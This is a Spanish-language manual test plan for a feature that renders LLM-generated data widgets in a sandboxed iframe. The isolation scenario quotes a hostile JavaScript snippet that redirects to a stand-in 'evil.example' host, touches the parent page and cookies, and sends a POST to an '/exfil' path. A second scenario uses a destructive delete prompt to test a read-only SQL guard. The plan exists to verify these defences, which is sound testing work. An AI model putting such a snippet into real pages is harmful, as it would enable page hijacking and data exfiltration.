# Quickstart: Feature 004 — Widget Generation & Canvas Rendering

Escenarios manuales de validación extremo a extremo. Cada escenario se ejecuta tras `docker-compose up` + navegador en `http://localhost:3000`, con LiteLLM configurado (env vars `LLM_MODEL_WIDGET`, keys del proveedor) y el fixture `sales_sample.db` cargado como `DataSourceConnection` activa.

Referencia de FR/SC mapeados al final de cada escenario.

---

## Escenario 1 — Widget por defecto desde una extracción SQL

**Pasos**:
1. Abrir la app, completar Setup Wizard con `sales_sample.db` y elegir framework visual `shadcn/ui`.
2. En el chat, enviar: *"muéstrame las ventas por mes del último año"*.
3. Observar el panel derecho.

**Resultado esperado**:
- El chat muestra el mensaje del usuario, un mensaje del asistente, un `AgentTrace` colapsable con la SQL generada.
- El Canvas derecho muestra un **gráfico de barras** o **gráfico de líneas** (según forma de datos) con eje X = meses, eje Y = ventas.
- Bajo el `AgentTrace` aparece un sub-bloque `WidgetGenerationTrace` con `status=success`, `widget_type_attempted=bar_chart|line_chart`, `generated_by_model=<alias>`.
- Inspector del navegador: el widget vive dentro de un `<iframe sandbox="allow-scripts" srcdoc="...">`.

**Valida**: US1 · FR-001 · FR-002 · FR-004 · FR-005 · FR-007 · FR-011 · SC-001 · SC-002 · SC-006.

---

## Escenario 2 — Widget KPI desde una agregación

**Pasos**:
1. Prompt: *"¿cuál es el total de ventas del año?"*.

**Resultado esperado**:
- Extracción con `row_count=1` y una única columna numérica.
- Canvas muestra un **KPI numérico** con el valor destacado y título generado.
- `selection_source=deterministic`.

**Valida**: R1 · FR-004 · FR-005 · SC-007.

---

## Escenario 3 — Estado vacío

**Pasos**:
1. Prompt: *"muéstrame las ventas en la región Antártida"* (sin resultados).

**Resultado esperado**:
- `data_extraction.v1` con `row_count=0`.
- Canvas muestra estado vacío informativo ("sin resultados para esta consulta").
- NO se invoca al Agente Generador (FR-001, condición `row_count > 0`).
- `WidgetGenerationTrace` NO se emite para esta interacción.

**Valida**: FR-001 · Edge Case "resultado vacío".

---

## Escenario 4 — Preferencia explícita en el chat

**Pasos**:
1. Tras el Escenario 1 (widget visible), enviar: *"prefiero verlo como tabla"*.

**Resultado esperado**:
- La extracción **no se re-ejecuta** (FR-006): `extraction_id` es el mismo.
- Canvas reemplaza el widget por una **tabla** con las mismas columnas y filas.
- `selection_source=user_preference` en el nuevo `WidgetSpec`.
- Respuesta del chat en < 3 segundos p95.

**Valida**: US2 · FR-006 · FR-006a · SC-005.

---

## Escenario 5 — Preferencia incompatible con los datos

**Pasos**:
1. Tras un KPI (Escenario 2), enviar: *"muéstramelo como heatmap"*.

**Resultado esperado**:
- Regla de aplicabilidad de heatmap falla (1 numérica sola, sin 2 categóricas).
- El chat responde explicando que ese tipo no aplica a los datos y sugiere alternativas válidas del catálogo.
- El KPI existente permanece visible en el Canvas (sin cambios).

**Valida**: FR-006 · Acceptance Scenario 2 de US2.

---

## Escenario 6 — Aislamiento: widget adversarial

**Pasos**:
1. Inyectar manualmente (via dev tools backend) un `WidgetSpec` con `code.js` que intenta:
   ```javascript
   parent.document.body.style.display = 'none';
   document.cookie = 'stolen=1';
   window.top.location = 'https://evil.example';
   fetch('https://evil.example/exfil', { method: 'POST' });
   ```
2. Disparar el render.

**Resultado esperado**:
- La app principal NO se ve afectada: chat visible, cookies intactas, URL sin cambiar.
- El widget falla a ejecutarse o se muestra pero sin efecto fuera del iframe.
- `widget:error` emitido con `code=RUNTIME_ERROR` (visible en `WidgetGenerationTrace`).
- En network tab: NINGUNA request al dominio externo (bloqueado por CSP `connect-src 'none'`).

**Valida**: US3 · FR-008 · FR-008a · SC-003.

---

## Escenario 7 — Timeout del bootstrap del iframe

**Pasos**:
1. Generar manualmente un `WidgetSpec` con `code.js` que nunca emite `widget:ready` (bucle `while(true)`).
2. Disparar el render.

**Resultado esperado**:
- Tras 4 segundos (R4), el Canvas dispara fallback tabular automático (FR-009).
- `WidgetGenerationTrace.status=fallback`, `error_code=RENDER_TIMEOUT`.
- Chat sigue operativo, puede recibir nuevo prompt.

**Valida**: FR-008b · FR-009 · SC-004.

---

## Escenario 8 — Falla del Agente Generador

**Pasos**:
1. Configurar LiteLLM mock para devolver respuesta no parseable (texto sin JSON).
2. Prompt: *"muéstrame las ventas por región"*.

**Resultado esperado**:
- La extracción se completa exitosamente (Data Agent independiente).
- El Agente Generador falla a producir una WidgetSpec válida.
- El sistema sustituye automáticamente por una WidgetSpec fallback (`widget_type=table`, `selection_source=fallback`, `generated_by_model=deterministic`).
- El Canvas muestra la tabla cruda.
- `WidgetGenerationTrace.status=fallback`, `error_code=SPEC_INVALID`.

**Valida**: US4 · FR-010 · SC-004 · R8.

---

## Escenario 9 — Truncación visible

**Pasos**:
1. Cargar un dataset con más de 1000 filas.
2. Prompt sin WHERE que devuelva más del límite.

**Resultado esperado**:
- `data_extraction.truncated=true`.
- `WidgetSpec.truncation_badge=true`.
- Canvas muestra el widget + un badge/indicador visible ("mostrando 1000 de N+ filas").

**Valida**: FR-013 · Edge Case "resultado truncado".

---

## Escenario 10 — Extracción con error

**Pasos**:
1. Prompt adversarial: *"borra todos los registros de ventas"*.

**Resultado esperado**:
- `ReadOnlySqlGuard` rechaza (Feature 003).
- `data_extraction.v1` retorna `status=error`, `error.code=SECURITY_REJECTION`.
- Agente Generador NO se invoca (FR-015).
- Canvas mantiene su estado previo (widget anterior visible si existía) o muestra placeholder inicial.
- `WidgetGenerationTrace` NO se emite.

**Valida**: FR-015 · Integración con Feature 003.

---

## Escenario 11 — Cambio de modo de render vía Setup Wizard

**Pasos**:
1. Con una sesión activa y un widget ya generado (modo `ui_framework` + `shadcn`), ir al Setup Wizard → paso "Framework visual" y seleccionar `bootstrap`.
2. Guardar.
3. Volver al chat y solicitar un nuevo widget.

**Resultado esperado**:
- `PUT /api/render-mode/profile` responde 200.
- El siguiente `WidgetSpec` se emite con `ui_library=bootstrap`.
- El código generado usa clases de Bootstrap (verificable en `widget_spec.code.html`).

**Valida**: R7 · FR-002a · dependencia con Feature 001.

---

## Escenario 12 — Modo Design System rechazado

**Pasos**:
1. Intentar `PUT /api/render-mode/profile` con `mode=design_system`.

**Resultado esperado**:
- Respuesta 400 con mensaje explicativo ("modo no disponible en MVP").
- La UI del wizard presenta la opción deshabilitada con badge "próximamente".

**Valida**: R2 · FR-002a (modo c diferido).

---

## Criterios de aceptación globales

La feature se considera `Ready for Implement → Done` cuando:

- [ ] Los 12 escenarios pasan manualmente.
- [ ] Tests unitarios + integración cubren R1 (selector determinístico), R4 (protocolo postMessage), R8 (fallback tabular), R10 (regex de preferencia).
- [ ] Test E2E Playwright cubre al menos Escenarios 1, 4, 6 y 8.
- [ ] ADL-016 a ADL-019 redactados.
- [ ] `roadmap.md` actualizado: Fase 5 marcada como completada.
- [ ] Feature 005 (colecciones, Phase 6) puede leer `widget_spec.v1` sin ambigüedad.
